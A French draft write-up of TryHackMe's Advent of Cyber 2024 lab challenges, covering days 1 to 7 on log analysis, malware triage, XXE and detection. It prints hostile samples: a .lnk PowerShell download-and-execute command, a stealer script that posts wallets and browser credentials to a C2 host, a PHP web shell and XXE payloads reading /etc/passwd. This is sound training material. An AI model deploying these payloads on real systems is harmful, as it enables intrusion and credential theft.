---
title: Advent Of Cyber 2024
tags: [TryHackMe, Facile, Avent, Défi, Brouillon]
style: border
color: thm
comments: false
description: Calendrier de l'avent de la Cyber 2024
modified: 20/03/2025
---
Lien vers l'épreuve : <https://tryhackme.com/room/adventofcyber2024>

>20/03/2025 : Ce compte-rendu est actuellement à l'état de brouillon. A partir du jour 19, la méthodologie n'est pas rédigée.

<div class="container">
    <div class="row">
        <div class="col-md-6 mt-5">
            <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/62c435d1f4d84a005f5df811-1728982657816" class="img-fluid" alt="Logo Événement">
        </div>
        <div class="col-md-6">
            <img src="https://assets.tryhackme.com/img/badges/aoc5.svg" class="img-fluid" alt="Badge AoC2024">
        </div>
    </div>
</div>

![Easy](https://img.shields.io/badge/Difficulté-Facile-Green?logo=tryhackme)

## Sommaire <!-- omit in toc -->

* [Jour 1 : Peut-être que la musique de SOC-mas, pensait-il, ne vient pas d'un magasin ?](#jour-1--peut-être-que-la-musique-de-soc-mas-pensait-il-ne-vient-pas-dun-magasin-)
* [Jour 2 : Le faux positif d'une personne, est le pot-pourri d'un autre](#jour-2--le-faux-positif-dune-personne-est-le-pot-pourri-dun-autre)
* [Jour 3 : Même si je voulais y aller, leurs vulnérabilités ne le permettraient pas](#jour-3--même-si-je-voulais-y-aller-leurs-vulnérabilités-ne-le-permettraient-pas)
* [Jour 4 : Je suis tout atomique à l'intérieur](#jour-4--je-suis-tout-atomique-à-lintérieur)
* [Jour 5 : *SOC-mas XX-what-ee?*](#jour-5--soc-mas-xx-what-ee)
* [Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas](#jour-6--si-je-ne-peux-pas-trouver-un-gentil-malware-à-utiliser-je-ne-le-ferai-pas)
* [Jour 7 : *Oh no. I'M SPEAKING IN CLOUDTRAIL!*](#jour-7--oh-no-im-speaking-in-cloudtrail)
* [Jour 8 : Shellcodes du monde, rassemblement](#jour-8--shellcodes-du-monde-rassemblement)
* [Jour 9 : 9 heure, rend le GRC amusant, ne le dis à personne](#jour-9--9-heure-rend-le-grc-amusant-ne-le-dis-à-personne)
* [Jour 10 : Il a un cerveau rempli de macro, et il a des shells dans son âme](#jour-10--il-a-un-cerveau-rempli-de-macro-et-il-a-des-shells-dans-son-âme)
* [Jour 11 : Si vous voulez vous connecter avec WPA, appuyez sur la touche étoile](#jour-11--si-vous-voulez-vous-connecter-avec-wpa-appuyez-sur-la-touche-étoile)
* [Jour 12 : Si je ne peux pas voler leur argent, je volerais leur argent](#jour-12--si-je-ne-peux-pas-voler-leur-argent-je-volerais-leur-argent)
* [Jour 13 : C'est arrivé sans mémoire tampon ! C'est arrivé sans lag](#jour-13--cest-arrivé-sans-mémoire-tampon--cest-arrivé-sans-lag)
* [Jour 14 : Même si nous sommes horriblement mal gérés, il n'y aura pas de visage triste durant SOC-mas](#jour-14--même-si-nous-sommes-horriblement-mal-gérés-il-ny-aura-pas-de-visage-triste-durant-soc-mas)
* [Jour 15 : Aussi odieux soit-il, il n'y a pas d'endroit comme le Contrôleur de Domaine](#jour-15--aussi-odieux-soit-il-il-ny-a-pas-dendroit-comme-le-contrôleur-de-domaine)
* [Jour 16 : *The Wareville’s Key Vault grew three sizes that day.*](#jour-16--the-warevilles-key-vault-grew-three-sizes-that-day)
* [Jour 17 : Il a analysé et analysé jusqu'à ce que l'analyseur soit douloureux](#jour-17--il-a-analysé-et-analysé-jusquà-ce-que-lanalyseur-soit-douloureux)
* [Jour 18 : Je pourrais utiliser de l'interaction avec l'IA](#jour-18--je-pourrais-utiliser-de-linteraction-avec-lia)
* [Jour 19 : J'ai juste remarqué que tu étais mal stocké, mon cher secret](#jour-19--jai-juste-remarqué-que-tu-étais-mal-stocké-mon-cher-secret)
* [Jour 20 : Si tu prononces ne serait-ce qu'un seul paquet](#jour-20--si-tu-prononces-ne-serait-ce-quun-seul-paquet)
* [Jour 21 : *HELP ME...I'm REVERSE ENGINEERING*](#jour-21--help-meim-reverse-engineering)
* [Jour 22 : *It's because I'm kubed, isn't it?*](#jour-22--its-because-im-kubed-isnt-it)
* [Jour 23 : *You wanna know what happens to your hashes?*](#jour-23--you-wanna-know-what-happens-to-your-hashes)
* [Jour 24 : Tu ne peux pas faire de mal à SOC-mas, Mayor Malware](#jour-24--tu-ne-peux-pas-faire-de-mal-à-soc-mas-mayor-malware)

## Jour 1 : Peut-être que la musique de SOC-mas, pensait-il, ne vient pas d'un magasin ?

![OPSEC](https://img.shields.io/badge/OPSEC-453368?logo=tryhackme)

![Jour 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1730193392309.svg)

Ce premier challenge nous demande d'enquêter sur un site web de téléchargement de vidéos YouTube au format `mp3` ou `mp4` : *The Glitch's All-in-One Converter*

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_website.png" caption="Site web permettant de télécharger des vidéos YouTube" %}

Nous utilisons le lien YouTube fourni dans le texte du défi (<https://www.youtube.com/watch?v=dQw4w9WgXcQ>) afin de tester les fonctionnalités de l'outil.

Nous choisissons le téléchargement en `mp4` et nous récupérons le fichier "super sécurisé"

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_download.png" caption="Téléchargement du fichier super sécurisé" %}

Nous décompressons le fichier obtenu, et nous constatons d'abord que les fichiers sont aux formats `mp3` et non `mp4` comme souhaité.

```bash
unzip download.zip 
Archive:  download.zip
 extracting: song.mp3                
 extracting: somg.mp3
```

Une rapide analyse du fichier `song.mp3` nous indique que malgré le choix de la vidéo en entrée, nous n'avons pas été [*Rick Rolled*](https://fr.wikipedia.org/wiki/Rickroll). A la place nous avons un rap de Noël.

```bash
exiftool song.mp3
```

{% capture spoil %}
ExifTool Version Number         : 11.88
File Name                       : song.mp3
Directory                       : .
[...expurgé pour brièveté...]
ID3 Size                        : 2176
Artist                          : T[...expurgé...]y
Album                           : Rap
Title                           : Mount HackIt
Encoded By                      : Mixcraft 10.5 Recording Studio Build 621
Year                            : 2024
Genre                           : Rock
Track                           : 0/1
Comment                         : 
Date/Time Original              : 2024
Duration                        : 0:03:11 (approx)
{% endcapture %}
{% include elements/spoil.html %}

En analysant de la même façon le fichier `somg.mp3` nous observons cette fois qu'il ne s'agit pas d'un fichier sonore, mais d'un lien permettant de télécharger et lancer un fichier PowerShell depuis Github

```bash
exiftool somg.mp3
```

{% capture spoil %}
ExifTool Version Number         : 11.88
File Name                       : somg.mp3
Directory                       : .
[...expurgé pour brièveté...]
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
[...expurgé pour brièveté...]
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
{% endcapture %}
{% include elements/spoil.html %}

En nous rendant sur le lien Github, nous pouvons constater qu'il s'agit d'un script permettant de contacter un serveur C2 (*Command & Control*) entraînant la compromission de la machine à des fins de minage de cryptomonnaie

```powershell
function Print-AsciiArt {
    #[...expurgé pour brièveté...]
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    #[...expurgé pour brièveté...]
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    #[...expurgé pour brièveté...]
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://[...expurgé...].thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```

En poussant l'analyse du compte Github, nous trouvons le nom de la personne qui se cache derrière le pseudo M.M.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_GithubUser.png" caption="Informations sur M.M." %}

En recherchant les *Issues* ouverts par cet utilisateur, nous trouvons un autre dépôt ayant un certain nombre de *Commits* que je ne dévoilerai pas pour conserver une part de challenge !

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_issue.png" caption="Une issue ouverte par l'utilisateur" %}

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_repo.png" caption="Le nombre de commits est la dernière question du jour" %}

## Jour 2 : Le faux positif d'une personne, est le pot-pourri d'un autre

![Log analysis](https://img.shields.io/badge/Log%20analysis-314267?logo=tryhackme)

![Jour 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730369227263.png)

Le défi du jour consiste en de l'analyse de log avec l'outil **Elastic**.

Nous commençons par cibler l'intervalle de temps 29/11/2024 00:00 --> 01/12/2024 23:30 comme indiqué dans l'histoire du jour.

Pour simplifier la lecture, nous choisissons d'afficher les valeurs :

* host.hostname
* user.name
* event.outcome
* event.category
* process.command_line
* source_ip

Pour trouver le compte à l'origine des connexions échouées, nous pouvons utiliser le bouton `-` pour exclure les connexions réussies et ne conserver que les échecs.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_failure.png" caption="Un seul compte à l'origine des échecs de connexions" %}

Nous observons plus de 6700 échecs sur la période indiquée.

Si nous filtrons les résultats sur l'adresse IP 10.0.11.11, nous n'observons pas de schéma particulier. En revanche, si nous excluons cette adresse, nous constatons un pic d'échecs provenant d'une autre adresse pouvant s'apparenter à une tentative de force brute.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_suspicious_ip.png" caption="Adresse IP suspecte" %}

En filtrant à présent sur les succès de cette adresse IP vers le serveur ADM-01, nous notons une connexion réussie.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_adm_success.png" caption="Connexion réussie à un serveur d'administration" %}

En regardant les actions réalisées depuis cette adresse IP suspecte, il apparaît une commande PowerShell qu'il convient de déchiffrer :

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==
```

A première vue, il s'agit d'une commande passée en base64 mais cela ne suffit pas. A l'aide de l'outil [CyberChef](https://gchq.github.io/CyberChef/) nous pouvons déchiffrer son contenu.

Pour faciliter le déchiffrement, nous utilisons l'opération *Magic* en mode intensif qui nous permet de forcer le chiffrement supplémentaire :

```powershell
Install-WindowsUpdate -AcceptAll -AutoReboot
```

Il s'agit finalement d'un faux positif. Quelqu'un essaie de mettre à jour les serveurs afin de mitiger les vulnérabilités.

## Jour 3 : Même si je voulais y aller, leurs vulnérabilités ne le permettraient pas

![Log analysis](https://img.shields.io/badge/Log%20analysis-453368?logo=tryhackme)

![Jour 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420330182.png)

Comme pour le défi de la veille, ce défi consiste à analyser des logs. La différence, c'est que cette fois il nous est demandé de rejouer l'attaque qui sera trouvée.

Les événements à analyser ont eu lieu le 3 octobre 2024 entre 11h30 et 12h00.

Pour faciliter la lecture, nous choisissons d'afficher les champs suivants :

* clientip
* message

La première étape consiste à trouver le chemin du fichier `shell.php` qui a été téléversé. Pour cela, nous utiliserons la requête KQL (Kibana Query Language) : `message:"shell.php"`

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_shell.png" caption="Informations concernant le shell et l'adresse IP qui l'a utilisé" %}

Nous allons à présent utiliser le code {% include dictionary.html word="PHP" %} fourni dans le défi pour reproduire l'attaque {% include dictionary.html word="RCE" %} observée.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

Ce code permet de créer une page web contenant un champ dans lequel nous pourrons entrer notre commande, et qui nous affichera la réponse en dessous.

Nous commençons par accéder à l'url `hxxp[://]frostypines[.]thm/admin/rooms[.]php`, là où nous avons observé la première occurrence de `shell.php`.

Grâce à l'analyse des logs, nous savons que le shell a été uploadé en tant qu'image pour illustrer une chambre à louer sur le site. Nous allons donc créer une nouvelle chambre afin de pouvoir déposer notre fichier.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_upload_shell.png" caption="Création d'une nouvelle chambre avec la page PHP" %}

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_upload_shell2.png" caption="Chambre créée" %}

Nous pouvons désormais accéder à notre shell via l'url `hxxp[://]frostypines[.]thm/[...expurgé...]/shell[.]php`

En listant les éléments présents dans le dossier actuel, nous y trouvons le fichier `flag.txt` que nous devons trouver

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_list.png" caption="Le fichier flag.txt est présent dans le dossier" %}

Nous pouvons lire le contenu du fichier pour conclure ce troisième jour.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_flag.png" caption="Le flag concluant le défi" %}

## Jour 4 : Je suis tout atomique à l'intérieur

![Atomic Red Team](https://img.shields.io/badge/Atomic%20Red%20Team-453368?logo=tryhackme)

![Jour 4](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1730709355879.png)

Les objectifs du jour sont d'identifier des techniques malicieuses avec le framework [MITRE ATT&CK](https://attack.mitre.org/), utiliser les tests [*Atomic Red Team*](https://www.atomicredteam.io/) pour mener des simulations d'attaques et créer des règles d'alerte et de détection basées sur ces tests.

Pour mener à bien les exercices du jour, il faut suivre la documentation afin de découvrir le fonctionnement des outils comme *Atomic Red Team*

La première étape consiste à vérifier si nous avons les bons prérequis pour exécuter notre premier test.

```txt
Invoke-AtomicTest T1566.001 -TestNumbers 1 -CheckPrereq
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
CheckPrereq's for: T1566.001-1 Download Macro-Enabled Phishing Attachment
Prerequisites met: T1566.001-1 Download Macro-Enabled Phishing Attachment
```

Après avoir nettoyer les logs de l'outil [Sysmon](https://learn.microsoft.com/fr-fr/sysinternals/downloads/sysmon), nous lançons le test.

De retour dans l'outil Event Viewer, dans le dossier Sysmon, nous observons la présence d'un événement ayant créé deux fichiers, dont un est le flag de la première question.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_sysmon.png" caption="Logs de la création des outils de phishing" %}

Nous récupérons le contenu du fichier texte créé :

```txt
Get-Content 'C:\Users\Administrator\AppData\Local\temp\PhishingAttachment.txt'
THM{[...expurgé...]}
```

Pour trouver quel identifiant ATT&CK est en jeu, nous nous rendons dans la section [*Command and Scripting Interpreter*](https://attack.mitre.org/techniques/T1059/)

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_mitre.png" caption="Sélection de la catégorie MITRE" %}

Le numéro de la catégorie apparaît dans l'encadré récapitulant la technique :

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_CSI.png" caption="Informations sur la technique Command and Scripting Interpreter" %}

En ouvrant les différentes sous-techniques associées nous trouvons celle qui est dédiée à Windows Command Shell :

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_subtechnique.png" caption="Sous-technique applicable à Windows Command Shell" %}

Pour trouver le nom du test Atomic à simuler, nous utilisons la commande `Invoke-AtomicTest` avec le flag `-ShowDetailsBrief`

```powershell
Invoke-AtomicTest T[...expurge...] -ShowDetailsBrief
```

{% capture spoil %}
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[...expurgé...]-1 Create and Execute Batch Script
[...expurgé...]-2 Writes text to a file and displays it.
[...expurgé...]-3 Suspicious Execution via Windows Command Shell
[...expurgé...]-4 [...expurgé...]
[...expurgé...]-5 Command Prompt read contents from CMD file and execute
{% endcapture %}
{% include elements/spoil.html %}

McSkidy souhaitant mettre en place un test imitant un *ransomware*, le test numéro **4** est celui qui sera joué.

En regardant les détails de ce test, nous pouvons trouver le nom du fichier qui sera nécessaire :

```powershell
Invoke-AtomicTest T[...expurge...] -TestNumbers 4 -ShowDetails
```

{% capture spoil %}
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T[...expurgé...]
Atomic Test Name: [...expurgé...]
Atomic Test Number: 4
Atomic Test GUID: 6b2903ac-8f36-450d-9ad5-b220e8a2dcb9
Description: This test attempts to open a file a specified number of times in Wordpad, then prints the contents.  It is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed.  See https://redcanary.com/blog/blackbyte-ransomware/.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
cmd /c "for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}" | Out-null
Command (with inputs):
cmd /c "for /l %x in (1,1,1) do start wordpad.exe /p C:\Tools\AtomicRedTeam\atomics\T[...expurgé...]\src\[...expurgé...].txt" | Out-null

Cleanup Commands:
Command:
stop-process -name wordpad -force -erroraction silentlycontinue

Dependencies:
Description: File to print must exist on disk at specified location (C:\Tools\AtomicRedTeam\atomics\T[...expurgé...]\src\[...expurgé...].txt)
Check Prereq Command:
if (test-path "#{file_to_print}"){exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (test-path "C:\Tools\AtomicRedTeam\atomics\T[...expurgé...]\src\[...expurgé...].txt"){exit 0} else {exit 1}
Get Prereq Command:
new-item #{file_to_print} -value "This file has been created by T[...expurgé...] Test 4" -Force | Out-Null
Get Prereq Command (with inputs):
new-item C:\Tools\AtomicRedTeam\atomics\T[...expurgé...]\src\[...expurgé...].txt -value "This file has been created by T[...expurgé...] Test 4" -Force | Out-Null
[!!!!!!!!END TEST!!!!!!!]
{% endcapture %}
{% include elements/spoil.html %}

Nous lançons la simulation, et à la fin nous avons un prompt nous proposant d'enregistrer un fichier PDF. Lorsque nous l'ouvrons, nous obtenons le dernier flag pour ce jour.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_flag.png" caption="Drapeau trouvé dans le fichier PDF créé à la fin du test" %}

## Jour 5 : *SOC-mas XX-what-ee?*

![XXE](https://img.shields.io/badge/XXE-4d354a?logo=tryhackme)

![Jour 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730807266344.png)

L'exercice du jour consiste à injecter un XXE (**X**ML E**X**ternal **E**ntity) afin d'obtenir des informations contenues sur le serveur, mais qui devrait être inaccessibles pour les utilisateurs.

Cette technique consiste à préparer une charge (*payload*) et l'ouvrir via la requête HTTP habituellement utilisée.

Par exemple, si la requête initiale ressemble à :

```xml
<people>
   <name>Glitch</name>
   <address>Wareville</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

Nous pouvons la modifier de telle façon pour pouvoir obtenir les informations des comptes présents sur le serveur :

```xml
<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   <address>&thmFile;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

En ajoutant le `DOCTYPE` et l'`ENTITY` nous pouvons ouvrir le fichier système `/etc/passwd` grâce à la variable `thmFile` que nous avons défini.

Pour commencer, nous accédons au site de vente de produits de Noël, nous ajoutons un objet dans notre *wishlist* et nous nous rendons dans notre panier (*Cart*) pour valider.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_cart.png" caption="Wishlist créée à valider" %}

Lorsque nous procédons au *Checkout*, le site nous indique que nous venons de créer le 21ème vœu. Mais lorsque nous cliquons sur le lien, nous avons un message d'erreur indiquant que seuls les elfes du Père Noël ont accès aux vœux.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_wish.png" caption="Notre panier est enregistré en tant que 21ème souhait" %}

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_error.png" caption="Nous n'avons pas accès à nos souhaits" %}

Par chance, nous avons utilisé [Burp Suite](https://portswigger.net/burp) afin d'intercepter les requêtes {% include dictionary.html word="HTTP" %}. L'outil nous permet de constater qu'une action sur la page `/wishlist.php` utilise le format {% include dictionary.html word="XML" %}.

```http
POST /wishlist.php HTTP/1.1
Host: 10.10.75.70
Content-Length: 215
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://10.10.75.70
Referer: http://10.10.75.70/product.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=s362bk13rtm6nqecg4b7ifdgin
Connection: keep-alive

<wishlist>
    <user_id>1</user_id>
    <item>
        <product_id>1</product_id>
    </item>
</wishlist>
```

Nous envoyons cette requête dans le *Repeater* de Burp, et nous modifions la partie {% include dictionary.html word="XML" %} de la manière suivante afin de vérifier si nous avons accès à notre *wishlist*:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY charge SYSTEM "/var/www/html/wishes/wish_21.txt"> ]>
<wishlist>
    <user_id>
        1
    </user_id>
    <item>
        <product_id>
            &charge;
        </product_id>
    </item>
</wishlist>
```

Nous obtenons bien notre panier :

```http
HTTP/1.1 200 OK
Date: Sat, 14 Dec 2024 10:26:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 213
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

The product ID: Wish #21
Name: Christmas Hacker
Address: Somewhere on Internet
---------------------------------------
Product: Wareville's Jolly Cap
Quantity: 1
---------------------------------------
is invalid.
```

Puisqu'il y a 20 autres souhaits avant le nôtre dans le dossier, nous envoyons cette requête vers la partie *Intruder* de Burp afin d'automatiser la recherche.

Nous positionnons la cible (entre les symboles `§`) sur le numéro du fichier `wish_§21§.txt`, un type de *Payload* "*Numbers*" de 1 à 20

Une fois l'attaque effectuée, nous constatons que la longueur de la 15ème réponse est significativement plus longue que les autres. En l'analysant, nous y trouvons un flag :

```http
HTTP/1.1 200 OK
Date: Sat, 14 Dec 2024 10:31:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 224
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

The product ID: Wish #15
Name: Mayor Malware
Address: Test
---------------------------------------
Product: Waredy Cane
Quantity: 1
---------------------------------------
PS: The flag is THM{[...expurgé..]}
is invalid.
```

Nous accédons à présent à la page de `CHANGELOG` pour trouver l'origine de cette vulnérabilité, et nous constatons un commit récent accompagné d'un flag.

```txt
commit 3f786850e387550fdab836ed7e6dc881de23001b (HEAD -> master, origin/master, origin/HEAD)
Author: Mayor Malware - Wareville <mayor@wareville.org>
Date:   Wed Dec 4 21:24:22 2024 +0200

    Fixed the wishlist.php page THM{[...expurgé...]}

[...expurgé pour brièveté...]
```

## Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas

![Sandboxes](https://img.shields.io/badge/Sandboxes-314267?logo=tryhackme)

![Jour 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730728443161.png)

Au programme de ce sixième jour, nous allons découvrir ce que nous pouvons faire pour piéger des malwares capables de détecter s'ils sont testés dans une *sandbox*, machine virtuelle sécurisée permettant de tester le fonctionnement et le comportement de programmes afin de déterminer leur dangerosité.

Comme indiqué dans le déroulé de la journée, nous commençons par lancer le script `JingleBells.ps1` qui est une règle de détection [YARA](https://en.wikipedia.org/wiki/YARA) destinée à détecter les malwares analysant leur environnement et se faire discret en cas d'utilisation en *sandbox*. Un tel malware apparaîtrait fiable en *sandbox* et pourrait être distribué sur des machines physiques où il causerait des dégâts.

Grâce à ce script, nous obtenons bien une alerte lorsque le malware `MerryChristmas.exe` est lancé.

```txt
YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp176D.tmp
Logging to file: C:\Tools\YaraMatches.txt
Event Time: 12/14/2024 10:53:07
Event ID: 1
Event Record ID: 127857
Command Line: reg  query "HKLM\Software\Microsoft\Windows\CurrentVersion" /v ProgramFilesDir
YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp176D.tmp
--------------------------------------


Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
--     ----            -------------   -----         -----------     --------             -------
1      Job1            BackgroundJob   Running       True            localhost            ...
YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp1FAB.tmp
Logging to file: C:\Tools\YaraMatches.txt
Event Time: 12/14/2024 10:53:07
Event ID: 1
Event Record ID: 127856
Command Line: C:\Windows\system32\cmd.exe /c reg query "HKLM\Software\Microsoft\Windows\CurrentVersion" /v ProgramFilesDir
YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp1FAB.tmp
--------------------------------------
3      Job3            BackgroundJob   Running       True            localhost            ...
```

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-06_yara.png" caption="Message d'alerte et flag" %}

Nous lançons à présent le programme `floss.exe` qui nous permettra d'extraire les chaînes de caractères présentes dans le malware

```powershell
floss.exe C:\Tools\Malware\MerryChristmas.exe | Out-File C:\Users\Administrator\Desktop\malstring.txt
```

En analysant le document créé à la recherche des lettres `THM` nous trouvons le flag caché dans le malware :

```powershell
Get-Content C:\Users\Administrator\Desktop\malstring.txt | Select-String THM
THM{[...expurgé...]}
```

## Jour 7 : *Oh no. I'M SPEAKING IN CLOUDTRAIL!*

![AWS log analysis](https://img.shields.io/badge/AWS%20log%20analysis-314267?logo=tryhackme)

![Jour 7](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730384938554.png)

AWS (pour *Amazon Web Services*) est un fournisseur de services basé sur le *Cloud*. Cette épreuve consiste à analyser les logs de la plateforme afin de trouver des manipulations potentiellement frauduleuses.

Nous commençons l'analyse par la commande suivante, et nous y trouvons les actions menés par l'utilisateur `glitch` qui nous est indiqué comme "anormal", son adresse IP, et le service AWS permettant de se connecter à la console ainsi que la date à laquelle cette connexion est intervenue :

```bash
jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "User_Agent"],(.Records[] | select(.userIdentity.userName == "glitch") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .userAgent //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'
```

{% capture spoil %}
Event_Time            Event_type        Event_Name                           Event_Source                         User_Name  Source_IP        User_Agent
2024-11-28T15:22:12Z  AwsApiCall        HeadBucket                           s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
2024-11-28T15:22:23Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
2024-11-28T15:22:25Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
2024-11-28T15:22:39Z  AwsApiCall        [...expurgé...]                      s3.amazonaws.com                     glitch     [...expurgé...]  [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36]
